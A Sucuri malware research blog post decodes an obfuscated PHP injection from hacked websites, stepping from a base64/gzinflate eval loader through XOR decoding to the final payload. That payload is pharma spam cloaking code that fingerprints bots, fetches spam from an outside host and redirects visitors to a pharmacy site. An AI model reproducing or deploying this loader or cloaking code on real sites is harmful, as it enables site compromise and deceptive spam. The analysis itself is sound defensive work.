<p>That&#8217;s a very real scenario and its why we&#8217;re sharing this post with you. This article will show you an intelligent SPAM injection and hopefully help you understand how it does what it does.</p>
<h3>Technical Analysis</h3>
<p>We find a number of different types of malware on a daily basis when clearing our client website&#8217;s. In most cases, you can tell right away its malware by looking at it. In other cases, with a little bit of work &#8211; decoding here, unpacking there &#8211; you can get it to a human-readable result.</p>
<p>The other day when analyzing such a site I came across this really interesting string of code:</p>
<blockquote><p>eval(gzinflate(base64_decode(&#8220;pf1r12XVdSYISukxfKNkNXK7uxJhNwinAgi<br />
T0QhQQBCBP9hj+EeUugXIAocqKqQEad0vf73PXvP2rHVmpKtGO1MQnHjfc87ee6255uW5/OP//vjj<br />
3378YX786z9+9B+fffLV44//+OGnv/7sl99/9JuPP/zu8fOP/vDZJ398/PGvP/z0+fXirx//5qPvP<br />
vskP/74Dx9++sfPfvnbj/79o2ePP/38H7/7+MPffvT9449//9kv//T44+8e/+azT3776998+Ol3H1<br />
0/+/GHf3x8+9Ff3179/eOP//3DT3/72S+f/ey7//HFz7/4l3+V//e7n7/97Mn3v3v9719783997c2<br />
/e/7nb7z&#8230;..</p></blockquote>
<p>At a first glance, it looks like a regular malware string in which it&#8217;s just echo&#8217;s code into a human-readable version, right?! Well.. not quite yet.</p>
<h3>Decoding</h3>
<p>After decoding it we get the following result:</p>
<blockquote><p>95t74_18i96s3_7c3r95y74p18t96e3d3=78;$r41e3s74o96u74r7c95e_c18r3y<br />
74p41t7e3d_c95o74d18e96=&#8221;rq&gt;&amp;&gt;<br />
CDCDCDCDCDj&amp;!=:sj^Q^]^K^^X^K^^Ui^F^Z^Z^^^Q^F^A^]^Zi^SuCDj/)+ :sj<br />
^Q^]^K^^X^K^^Ui^F^Z^Z^^^Q^[^]^K^^Q<br />
^O ^K^@^Zi^SuCDj&amp;!=:^?nsn=:&lt;^Q&lt;+&gt;&#8221;/-+fl999`lbllbj&amp;!=:guCDj&amp;!=:^?s#*<br />
{fj&amp;!=:^?guCDj*'&lt;s:&lt;&#8216;#f=: &lt;^Q&lt;+&gt;&#8221;/fi999`ibiibj^Q^]^K^^X^K^^Ui^F^Z^<br />
Z^^^Q^F^A^]^Zi^S`j^Q^]^K^^X^K^^Ui^^K^_^[^K^]^Z^Q^[^^Gi^<br />
SgguCDj*'&lt;s#*{fj*'&lt;guCDnnnnj=+&lt;8+&lt;^Q/&#8211;+&gt;:^Q&#8221;/ );/)+nsn^Nj^Q^]^K^^X^K^^<br />
Ui^F^Z^Z^^^Q^O^M^M^K^^^Z^Q^B^O^@ ^[^O ^Ki^SuCDnnnnj=+&lt;8+&lt;^Q;=+&lt;^Q/)+ :nsn^Nj^Q^]^K^^X^K^^Ui^F^Z^Z^^^Q^[^]^K^^Q^O ^K^@^Zi^SH^<br />
&#8230;^Q^H^A^i^SuCDnnnnj=+&lt;8+&lt;^Q&lt;+#!:+^Q/**&lt;</p></blockquote>
<p>Once again, we see an encrypted file. Is it all lost?</p>
<p>Of course not!</p>
<p>It may be overwhelming at first but if you look closely you will start to see a pattern.</p>
<p>Let&#8217;s take a look once again at the beginning ot the code and the end of it:</p>
<blockquote><p>&#8212; FOF &#8212;<br />
$k74e41y7_t3h95a74t18_96s3c41r7i3p95t74_18i96s3_7c3r95y74p18t96e3d3=78;<br />
$r41e3s74o96u7 4r7c95e_c18r3y74p41t7e3d_c95o74d18e96=&#8221;rq&gt;&amp;&gt;<br />
CDCDCDCDCDj&amp;!=:sj^Q^]^K^^X^K^&#8230;.</p>
<p>&#8212; EOF &#8212;<br />
&#8230;.&amp;::&gt;c+?;&#8217;8si&lt;+(&lt;+=&amp;in-! :+ :si^?uj;&lt;&#8220;&lt;+*&#8217;-:ipra&amp;+/*pr,!*7pCDra,!*7pra&amp;:#&#8221;plgu3CDG3C<br />
DCD^N(-&#8220;!=+nfj(&#8216;&#8221;+guCD3CDCD&lt;+/*(&#8216;&#8221;+fj(&#8216;&#8221;+-/-&amp;+guCDCDaaaaaaaaaaaaaCD+6&#8217;:unn3CDqp&#8221;;$s74t7r95i18n3g_o41u3t74p96u95t3=<br />
$r41e3s74o96u74r7c<br />
95e_c18r3y74p41t7e3d_c95o74d18e96;$l3e96n18t74h_o95f_c3r7y41p74t96e18<br />
d_c74o95d3e7= strlen($s74t7r95i18n3g_o41u3t74p96u95t3);<br />
$e3v18a95l_p7h74p_c41o3d74e96=&#8221;;<br />
for($h96u74i3v41a74m7v95s18e3m=0;$h96u74i3v41a74m7v95s18e3m&lt;$l3e96n18t74h_o95<br />
f_c3r7y41p74t96e18d_c74o95d3e7;$h96u74i3v41a74m7v95s18e3m++)$e3v18a95l_p7h7<br />
4p_c41o3d74e96 .= chr(ord($s74t7r95i18n3g_o41u3t74p96u95t3[$h96u74i3v41a74m7v95s18e3m]) ^ $k74e41y7_t3h95a74t18_96s3c41r7i3p95t74_18i96s3_7c3r95y74p18t96e3d3);<br />
eval(&#8220;?&gt;&#8221;.$e3v18a95l_p7h74p_c41o3d74e96.&#8221;&lt;?&#8221;);</p></blockquote>
<p>Come on, can&#8217;t you see?</p>
<p>Let me make it easier for you,  start with the beginning. Starting from left to right, take out the 74, 41, 7, 3, 95, 4, 18, 96&#8230; see it now?</p>
<blockquote><p>$k74e41y7_t3h95a74t18_96s3c41r7i3p95t74_18i96s3_7c3r95y74p18t96e3d3=78;<br />
$r41e3s74o96u74r7c95e_c18r3y74p41t7e3d_c95o74d18e96=&#8221;rq&gt;&amp;&gt;<br />
CDCDCDCDCDj&amp;!=:sj^Q^]^K^^X^K^&#8230;.</p></blockquote>
<p>If you are familiar with PHP it may not be strange to you. It&#8217;s just declaring some variables, but what are they?</p>
<p>After taking out those pesky numbers, look at what we find:</p>
<blockquote><p>$key_that_script_is_crypted=78; &lt;&#8212; WHOAAA!<br />
$resource_crypted_code=&#8221;rq&gt;&amp;&gt;CDCDCDCDCDj&amp;!=:sj^Q^]^K^^X^K^&#8230;. &lt;&#8212; WHOAAA! [2]</p></blockquote>
<p>Now let&#8217;s take a look at the end of the code. Keeping in mind what we just did at the beginning of the file, lets break it down:</p>
<blockquote><p>&#8230;&#8230;.&amp;::&gt;c+?;&#8217;8si&lt;+(&lt;+=&amp;in-! :+ :si^?uj;&lt;&#8220;&lt;+*&#8217;-:ipra&amp;+/*pr,!*7pCDra,!*7pra&amp;:#&#8221;plgu3CDG3CDCD^N(-&#8220;!=+nfj(&#8216;&#8221;+guCD3CDCD&lt;+/*(&#8216;&#8221;+fj(&#8216;&#8221;+-/-&amp;+guCDCDaaaaaaaaaaaaaCD+6&#8217;:unn3CDqp&#8221;;</p>
<p>$s74t7r95i18n3g_o41u3t74p96u95t3=$r41e3s74o96u74r7c95e_<br />
c18r3y74p41t7e3d_c95o74d18e96;<br />
$l3e96n18t74h_o95f_c3r7y41p74t96e18d_c74o95d3e7=<br />
strlen($s74t7r95i18n3g_o41u3t74p96u95t3);<br />
$e3v18a95l_p7h74p_c41o3d74e96=&#8221;;</p>
<p>for($h96u74i3v41a74m7v95s18e3m=0; $h96u74i3v41a74m7v95s18e3m &lt; $l3e96n18t74h_o95f_c3r7y41p74t96e18d_c74o95d3e7; $h96u74i3v41a74m7v95s18e3m++)<br />
$e3v18a95l_p7h74p_c41o3d74e96 .= chr(ord($s74t7r95i18n3g_o41u3t74p96u95t3[$h96u74i3v41a74m7v95s18e3m]) ^ $k74e41y7_t3h95a74t18_96s3c41r7i3p95t74_18i96s3_7c3r95y74p18t96e3d3);<br />
eval(&#8220;?&gt;&#8221;.$e3v18a95l_p7h74p_c41o3d74e96.&#8221;&lt;?&#8221;);</p></blockquote>
<p>Way easier now huh?!</p>
<blockquote><p>&#8230;&#8230;.&amp;::&gt;c+?;&#8217;8si&lt;+(&lt;+=&amp;in-! :+ :si^?uj;&lt;&#8220;&lt;+*&#8217;-:ipra&amp;+/*pr,!*7pCDra,!*7pra&amp;:#&#8221;plgu3CDG3CDCD^N(-&#8220;!=+nfj(&#8216;&#8221;+guCD3CDCD</p>
<p>$string_output=$resource_crypted_code; &lt;&#8211; NICE!<br />
$lenth_of_crypted_code=strlen($string_output); &lt;&#8211; Yes! The malicious attacker wrote lenth (length)<br />
$eval_php_code=&#8221;; &lt;&#8211; EASY</p>
<p>for ($huivamvsem=0; $huivamvsem &lt; $lenth_of_crypted_code; $huivamvsem++)<br />
$eval_php_code .= chr(ord($string_output[$huivamvsem]) ^ $key_that_script_is_crypted);<br />
eval(&#8220;?&gt;&#8221;.$eval_php_code.&#8221;&lt;?&#8221;);</p></blockquote>
<p>Once again, if you are familiar with PHP and basic encryption, you&#8217;ll notice the code doing an XOR with the variable $key_that_script_is_crypted.</p>
<p>It gets the encrypted data from $resource_crypted_code and stores in $string_output. After that there&#8217;s a loop to decode the encrypted data, XOR&#8217;ing it with the $key_that_script_is_crypted, and storing the results in the variable $eval_php_code.</p>
<p>The eval(..) in the last line just executes/calls the decoded script stored in $eval_php_code.</p>
<h3>Final code</h3>
<p>Finally, after all that, the PHP file generated is:</p>
<blockquote><p>$host=$_SERVER[&#8216;HTTP_HOST&#8217;];<br />
$agent=$_SERVER[&#8216;HTTP_USER_AGENT&#8217;];<br />
$host1 = str_replace(&#8220;www.&#8221;,&#8221;&#8221;,$host);<br />
$host1=md5($host1);<br />
$dir=trim(str_replace(&#8216;www.&#8217;,&#8221;,$_SERVER[&#8216;HTTP_HOST&#8217;].$_SERVER[&#8216;REQUEST_URI&#8217;]<br />
));<br />
$dir=md5($dir);<br />
$server_accept_language = @$_SERVER[&#8216;HTTP_ACCEPT_LANGUAGE&#8217;];<br />
$server_user_agent = @$_SERVER[&#8216;HTTP_USER_AGENT&#8217;];<br />
$server_referer = @$_SERVER[&#8216;HTTP_REFERER&#8217;];<br />
..<br />
$server_request = @$_SERVER[&#8216;REQUEST_URI&#8217;];<br />
function detectBot($server_user_agent,$server_ip,$my_url_for_log,<br />
$server_query_string,<br />
$server_referer,$enable_logging){<br />
$stop_ips_masks = array(<br />
&#8220;66.249.[6-9][0-9].[0-9]+&#8221;,<br />
&#8220;70.91.180.25&#8221;,<br />
&#8220;65.5[2-5].[0-9]+.[0-9]+&#8221;,<br />
&#8220;74.6.[0-9]+.[0-9]+&#8221;,<br />
&#8220;67.195.[0-9]+.[0-9]+&#8221;,<br />
&#8220;72.30.65.32&#8221;,<br />
&#8220;93.172.94.227&#8221;,<br />
&#8220;212.100.250.218&#8221;,<br />
&#8220;71.165.223.134&#8221;,<br />
..<br />
&#8220;117.211.123.62&#8221;,<br />
&#8220;91.187.103.152&#8221;,<br />
&#8220;208.80.74.7&#8221;,<br />
&#8220;207.164.79.6&#8221;,<br />
&#8220;89.149.253.169&#8221;);<br />
$stop_agents_masks = array(&#8220;http&#8221;, &#8220;google&#8221;, &#8220;slurp&#8221;, &#8220;msnbot&#8221;, &#8220;bot&#8221;,<br />
&#8220;crawl&#8221;, &#8220;spider&#8221;, &#8220;robot&#8221;, &#8220;HttpClient&#8221;, &#8220;curl&#8221;, &#8220;PHP&#8221;, &#8220;Indy Library&#8221;,<br />
&#8220;WordPress&#8221;,&#8217;Charlotte&#8217;,&#8217;wwwster&#8217;,&#8217;Python&#8217;,&#8217;urllib&#8217;,&#8217;perl&#8217;,&#8217;libwww&#8217;,&#8217;lynx&#8217;,<br />
&#8216;Twiceler&#8217;,&#8217;rambler&#8217;,&#8217;yandex&#8217;);<br />
$server_user_agent = preg_replace(&#8220;|User.Agent:[s ]?|i&#8221;, &#8220;&#8221;,<br />
@$server_user_agent);<br />
$is_human = true; $stop_ip_detected = false; $stop_agent_detected = false; $detected_str = &#8220;&#8221;;<br />
foreach ($stop_ips_masks as $stop_ip_mask) if(eregi(&#8220;$stop_ip_mask&#8221;, $server_ip)) {<br />
$is_human = false; break;<br />
}<br />
if($is_human) foreach($stop_agents_masks as $stop_agents_mask)<br />
if(eregi($stop_agents_mask, @$server_user_agent) !== false){<br />
$is_human = false; break;<br />
}<br />
if($is_human and !eregi(&#8220;^[a-zA-Z]{5,}&#8221;, @$server_user_agent)) {<br />
$is_human = false;<br />
}</p>
<p>if($is_human and strlen($server_user_agent)&lt;=11) {<br />
$is_human = false;<br />
}</p>
<p>if(stristr($server_referer,$server_query_string)) {<br />
$is_human = false;<br />
}<br />
return $is_human;<br />
}<br />
@$is_human = @detectBot($server_user_agent,$server_ip,$my_url_for_log,<br />
$server_query_string,$server_referer,$enable_logging);<br />
if (@$is_human==false)<br />
{<br />
if (is_file($gde.&#8221;.$dir)) {<br />
include($gde.&#8221;.$dir);<br />
exit;<br />
}<br />
}<br />
$reff = $_SERVER[&#8220;HTTP_REFERER&#8221;];<br />
$reff = strtolower($reff);<br />
if (preg_match(&#8216;/viagra|cialis|levitra|pharmacy|drugstore|<br />
prescription|drugs|discount|ED|erectile/&#8217;, $reff)) {</p>
<p>//include &#8216;theme.php&#8217;;</p>
<p>$filecache=$_SERVER[&#8216;DOCUMENT_ROOT&#8217;].&#8217;/wp-admin/whois.dat&#8217;;<br />
$randomtime=rand(1,3);<br />
$urlx=&#8217;http://ochkomandrit.com/wp-content/themes/twentyeleven/languages/admin.txt&#8217;;<br />
$urlredict=&#8217;http://www.canadian-medshop.com/?aid=9565&#8242;;</p>
<p>$time_sec=time();@$time_file=filemtime($filecache);$time=($time_sec-$time_file)/360;</p>
<p>function curl_gets($url){<br />
$ch = curl_init();<br />
curl_setopt($ch, CURLOPT_URL, $url);<br />
curl_setopt($ch, CURLOPT_HEADER, false);<br />
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);<br />
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);<br />
curl_setopt($ch, CURLOPT_USERAGENT, &#8216;Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.0)&#8217;);<br />
$data = curl_exec($ch);<br />
$httpcode = curl_getinfo ( $ch, CURLINFO_HTTP_CODE);<br />
curl_close($ch);</p>
<p>if ($httpcode!=&#8217;200&#8242;) $data=&#8217;404&#8242;;<br />
return $data;<br />
}</p>
<p>if (($time&gt;$randomtime)||(filesize($filecache)==0))<br />
{<br />
$tmpx=curl_gets($urlx);<br />
if ($tmpx!=404){$file = fopen ($filecache,&#8221;w+&#8221;);if ( $file ) {fputs ( $file, $tmpx);}}<br />
else {<br />
$file = fopen ($filecache,&#8221;a+&#8221;);if ( $file ) {fputs ( $file, &#8221;); }<br />
if ($urlredict) {exit(&#8220;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&#8217;refresh&#8217; content=&#8217;1;$urlredict&#8217;&gt;&lt;/head&gt;&lt;body&gt;&#8221;);}<br />
}</p>
<p>@fclose ($file);<br />
}</p>
<p>readfile($filecache);</p>
<p>/////////////<br />
exit; }</p></blockquote>
<h2>So what is it doing?</h2>
<p>In short, the code you see above will try to determine who is visiting the site (a bot, a normal user or one of the blocked IP addresses), and display SPAM from <em>http://ochkomandrit.com/wp-content/themes/twentyeleven/languages/admin.txt</em>, or redirect www.canadian-medshop.com depending on the case.</p>
<p>So yes, all of that just to display SPAM on a compromised site.</p>
<hr />
<p>Check if your site is compromised with spam here: <a href="http://sitecheck.sucuri.net">Sucuri SiteCheck</a></p>
<aside class="mashsb-container mashsb-main mashsb-stretched"><div class="mashsb-box"><div class="mashsb-buttons"><a class="mashicon-facebook mash-small mash-center mashsb-shadow" href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fblog.sucuri.net%2F2012%2F03%2Fintelligent-pharma-spam-decoded.html" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Facebook</span></a><a class="mashicon-twitter mash-small mash-center mashsb-shadow" href="https://twitter.com/intent/tweet?text=Intelligent%20%28Pharma%29%20Spam%20Decoded&url=https://blog.sucuri.net/2012/03/intelligent-pharma-spam-decoded.html&via=sucurisecurity" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Twitter</span></a><a class="mashicon-subscribe mash-small mash-center mashsb-shadow" href="#" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Subscribe</span></a><div class="onoffswitch2 mash-small mashsb-shadow" style="display:none;"></div></div>
            </div>
                <div style="clear:both;"></div></aside>
            <!-- Share buttons by mashshare.net - Version: 3.8.1--></div><footer class="entry-footer"><p class="entry-meta"><span class="entry-categories">Categories: <a href="https://blog.sucuri.net/category/website-malware-infections" rel="category tag">Website Malware Infections</a></span><span class="entry-tags">Tags: <a href="https://blog.sucuri.net/tag/hacked-websites" rel="tag">Hacked Websites</a>, <a href="https://blog.sucuri.net/tag/malware-updates" rel="tag">Malware Updates</a>, <a href="https://blog.sucuri.net/tag/seo-spam" rel="tag">SEO Spam</a></span></p></footer></article><section class="author-box"><img alt='' src='https://secure.gravatar.com/avatar/8cf56aa2ff693db59b0e186bf1b34f5a?s=115&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/8cf56aa2ff693db59b0e186bf1b34f5a?s=230&#038;d=mm&#038;r=g 2x' class='avatar avatar-115 photo' height='115' width='115' loading='lazy'/><h4 class="author-box-title">About <span itemprop="name">Rodrigo Escobar</span></h4><div class="author-box-content" itemprop="description"><p>Rodrigo Escobar is Sucuri's Sr. Malware Research Manager who joined the company in 2012. Rodrigo's main responsibilities include the coordination of malware analysts and research groups, and deployment of effective remediation solutions. His professional experience covers more than eight years in website remediation and malware analysis. When Rodrigo isn't investigating cyber threats and looking for solutions to prevent them, you might find him at the computer, reading assembly and learning new skills. Connect with him on <a href="https://www.linkedin.com/in/rodrigo-escobar-6b313314/">LinkedIn</a>.</p>
</div></section><h2 class="screen-reader-text">Reader Interactions</h2><div class="entry-comments" id="comments"><h3>Comments</h3><ol class="comment-list">
	<li class="comment even thread-even depth-1" id="comment-5403">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/f465f984993c2839448cc5aeec330130?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/f465f984993c2839448cc5aeec330130?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://www.premierleague.gr/" class="comment-author-link" rel="external nofollow" itemprop="url">Premier League</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2012-04-05T10:47:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2012/03/intelligent-pharma-spam-decoded.html#comment-5403">April 5, 2012</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Nice site&#8230; keep the good job</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-5428">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/9e1764000abff1a81ecc4f3503a2f7c1?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/9e1764000abff1a81ecc4f3503a2f7c1?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://www.my-blog-review.com/" class="comment-author-link" rel="external nofollow" itemprop="url">Steve</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2012-04-20T23:23:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2012/03/intelligent-pharma-spam-decoded.html#comment-5428">April 20, 2012</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Damn all this makes me wonder if my websites are ever safe&#8230;?</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ol></div></main><aside class="sidebar sidebar-primary widget-area" role="complementary" aria-label="Primary Sidebar" itemscope itemtype="https://schema.org/WPSideBar" id="genesis-sidebar-primary"><h2 class="genesis-sidebar-title screen-reader-text">Primary Sidebar</h2><div class="sidebar-primary-wrap"><section id="text-5" class="widget widget_text"><div class="widget-wrap"><h3 class="widgettitle widget-title">Socialize With Sucuri</h3>
			<div class="textwidget"><p>We're actively engaged across multiple platforms. Follow us and let's connect!</p>
<ul class="social-icons">
<li><a target="_blank" href="https://www.facebook.com/SucuriSecurity" rel="noopener"><span class="screen-reader-text">Facebook</span></a></li>
<li><a target="_blank" href="https://twitter.com/sucurisecurity" rel="noopener"><span class="screen-reader-text">Twitter</span></a></li>
<li><a target="_blank" href="https://www.linkedin.com/company/sucuri-security" rel="noopener"><span class="screen-reader-text">LinkedIn</span></a></li>
<li><a target="_blank" href="https://www.youtube.com/c/sucurinet" rel="noopener"><span class="screen-reader-text">YouTube</span></a></li>
<li><a target="_blank" href="https://www.instagram.com/sucurisecurity/" rel="noopener"><span class="screen-reader-text">Instagram</span></a></li>
<li><a target="_blank" href="https://blog.sucuri.net/feed/" rel="noopener"><span class="screen-reader-text">RSS Feed</span></a></li>
</ul>
</div>
		</div></section>
<section id="search-3" class="widget widget_search"><div class="widget-wrap"><form class="search-form" method="get" action="https://blog.sucuri.net/"><label class="search-form-label screen-reader-text" for="searchform-62ea510784302">Search the blog</label><input type="search" name="s" id="searchform-62ea510784302" placeholder="Search the blog" /><input type="submit" value="Search" /></form></div></section>
<section id="text-14" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><p><a href="https://sucuri.net/webinars/anatomy-of-website-malware?utm_source=Blog&amp;utm_medium=WidgetLogic&amp;utm_campaign=Webinar&amp;utm_term=EN&amp;utm_content=Anatomy-of-Malware" target="_blank" rel="noopener"><img loading="lazy" class="size-full wp-image-23220 aligncenter" src="https://blog.sucuri.net/wp-content/uploads/2019/05/blog-sidebar_widgetlogic_webinars_anatomy-of-website-malware.png" alt="The Anatomy of Website Malware Webinar" width="250" height="352" /></a></p>
</div>
		</div></section>
<section id="text-36" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><p><a href="https://sucuri.net/webinars/what-is-seo-spam-and-how-to-fight-it?utm_source=Blog&amp;utm_medium=WidgetLogic&amp;utm_campaign=Webinar&amp;utm_term=EN&amp;utm_content=SEO-Spam" target="_blank" rel="noopener"><img loading="lazy" class="size-full wp-image-23487 aligncenter" src="https://blog.sucuri.net/wp-content/uploads/2019/05/blog-sidebar_widgetlogic_webinars_seo-spam.png" alt="" width="250" height="352" /></a></p>
</div>
		</div></section>
<section id="text-37" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"></div>
		</div></section>
</div><div class="sidebar-cta-widget" id="sidebar-cta"><section id="text-6" class="widget widget_text"><div class="widget-wrap"><h3 class="widgettitle widget-title">Join Over 20,000 Subscribers!</h3>
			<div class="textwidget"><p><a href="http://sucuri.hs-sites.com/subscribe-to-security" onClick="ga('send', 'event', 'Blog', 'Button_Click', 'Subscribe_to_Security_Newsletter');"><img src="https://blog.sucuri.net/wp-content/uploads/2017/09/17-EN-sucuri-blog-newsletter-banner.png" /></a></p>
</div>
		</div></section>
</div></aside></div></div></div><footer class="site-footer" itemscope itemtype="https://schema.org/WPFooter"><div class="footer-widgets" id="genesis-footer-widgets"><h2 class="genesis-sidebar-title screen-reader-text">Footer</h2><div class="wrap"><div class="widget-area footer-widgets-1 footer-widget-area"><section id="nav_menu-3" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Products</h3>
<div class="menu-footer-products-menu-container"><ul id="menu-footer-products-menu" class="menu"><li id="menu-item-15501" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15501"><a href="https://sucuri.net/website-firewall/" itemprop="url">Website Firewall</a></li>
<li id="menu-item-15502" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15502"><a href="https://sucuri.net/website-antivirus/" itemprop="url">Website AntiVirus</a></li>
<li id="menu-item-15503" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15503"><a href="https://sucuri.net/website-backups/" itemprop="url">Website Backups</a></li>
<li id="menu-item-15504" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15504"><a href="https://sucuri.net/wordpress-security/" itemprop="url">WordPress Security</a></li>
<li id="menu-item-15505" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15505"><a href="https://sucuri.net/custom/enterprise/" itemprop="url">Enterprise Services</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-2 footer-widget-area"><section id="nav_menu-4" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Solutions</h3>
<div class="menu-footer-solutions-menu-container"><ul id="menu-footer-solutions-menu" class="menu"><li id="menu-item-15506" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15506"><a href="https://sucuri.net/website-firewall/ddos-protection" itemprop="url">DDos Protection</a></li>
<li id="menu-item-15507" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15507"><a href="https://sucuri.net/website-antivirus/malware-scanning-and-detection" itemprop="url">Malware Detection</a></li>
<li id="menu-item-15508" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15508"><a href="https://sucuri.net/website-antivirus/malware-removal" itemprop="url">Malware Removal</a></li>
<li id="menu-item-15510" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15510"><a href="https://sucuri.net/website-firewall/stop-website-attacks-and-hacks" itemprop="url">Malware Prevention</a></li>
<li id="menu-item-15511" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15511"><a href="https://sucuri.net/website-antivirus/blacklist-removal-and-repair" itemprop="url">Blacklist Removal</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-3 footer-widget-area"><section id="nav_menu-6" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Support</h3>
<div class="menu-footer-support-menu-container"><ul id="menu-footer-support-menu" class="menu"><li id="menu-item-15512" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15512"><a href="https://blog.sucuri.net/" itemprop="url">Blog</a></li>
<li id="menu-item-15513" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15513"><a href="https://kb.sucuri.net/" itemprop="url">Knowledge Base</a></li>
<li id="menu-item-15515" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15515"><a href="https://sitecheck.sucuri.net/" itemprop="url">SiteCheck</a></li>
<li id="menu-item-15516" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15516"><a href="http://labs.sucuri.net/" itemprop="url">Research Labs</a></li>
<li id="menu-item-15517" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15517"><a href="https://sucuri.net/faq/" itemprop="url">FAQ</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-4 footer-widget-area"><section id="nav_menu-5" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Company</h3>
<div class="menu-footer-company-menu-container"><ul id="menu-footer-company-menu" class="menu"><li id="menu-item-15495" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15495"><a href="https://sucuri.net/company/" itemprop="url">About</a></li>
<li id="menu-item-15496" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15496"><a href="https://sucuri.net/company/media" itemprop="url">Media</a></li>
<li id="menu-item-15497" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15497"><a href="https://sucuri.net/company/events" itemprop="url">Events</a></li>
<li id="menu-item-15498" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15498"><a href="https://sucuri.net/company/employment/" itemprop="url">Employment</a></li>
<li id="menu-item-15499" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15499"><a href="https://sucuri.net/company/contact-us" itemprop="url">Contact</a></li>
<li id="menu-item-15500" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15500"><a href="https://sucuri.net/customers/" itemprop="url">Testimonials</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-5 footer-widget-area"><section id="text-4" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><ul class="social-icons">
<li><a href="https://www.facebook.com/SucuriSecurity"><span class="screen-reader-text">Facebook</span></a></li>
<li><a href="https://twitter.com/sucurisecurity"><span class="screen-reader-text">Twitter</span></a></li>
<li><a href="https://www.linkedin.com/company/sucuri-security"><span class="screen-reader-text">LinkedIn</span></a></li>
<li><a href="https://www.instagram.com/sucurisecurity/"><span class="screen-reader-text">Instagram</span></a></li>
</ul>
<p><a class="button" href="https://dashboard.sucuri.net/login/">Customer Login</a></p>
<p><a class="footer-logo" href="https://sucuri.net/">Sucuri Home</a></p>
</div>
		</div></section>
</div></div></div><div class="site-footer-widget"><div class="wrap"><section id="text-8" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><div class="site-footer-links">
<ul>
<li><a href="https://sucuri.net/terms">Terms of Use</a></li>
<li><a href="https://sucuri.net/privacy">Privacy Policy</a></li>
<li><a href="https://sucuri.net/faq/">Frequently Asked Questions</a></li>
</ul>
</div>
<div class="site-footer-copyright">
<p>&#x000A9;&nbsp;2022 Sucuri Inc. All rights reserved</p>
</div>
</div>
		</div></section>
</div></div></footer></div><script type="text/javascript">
ire('identify', {customerId: '​​', customerEmail: '​​'}); </script><div id="cookie-policy-banner" class="container-fluid cookie-policy-banner hide p-0">
        <div class="container">
            <button id="cookie-policy-decline-btn" class="cb-close cb-decline-anchor">X</button>
            <div class="row">
                <div class="c-lg-8">
                    <p class="mb-0 mt-0 highlight green heavy">Sucuri Cookie Policy <br> <a href="https://sucuri.net/cookies" target="_blank" class="bolder no-underline">See our policy>></a></p>
                    <p class="mb-0 mt-0">Our website uses cookies, which help us to improve our site and enables us to deliver the best possible service and customer experience.</p>
                </div>
                <div class="c-lg-4 d-flex justify-items-start mt-15 align-items-center">
                    <button id="cookie-policy-btn" class="btn btn-primary ml-0">Accept</button>
                    <button class="btn cb-decline-anchor auto-track" data-gatrack="Cookie_Click, Decline">Decline</button>
                    <button id="manage-privacy-options" class="btn">Manage Options</button>
                </div>
            </div>
        </div>
    </div><script type="text/javascript">
		/* MonsterInsights Scroll Tracking */
